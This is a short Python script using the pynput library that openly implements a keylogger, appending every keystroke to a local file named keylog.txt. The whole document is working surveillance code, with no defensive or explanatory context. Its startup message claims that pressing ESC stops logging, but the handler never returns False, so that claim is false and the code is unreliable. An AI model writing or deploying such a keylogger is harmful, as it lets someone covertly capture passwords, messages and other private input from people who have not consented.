pip install pynput

from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as log:
            log.write(f" {key} ")

def main():
    print("🔍 Keylogger started (press ESC to stop)...")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
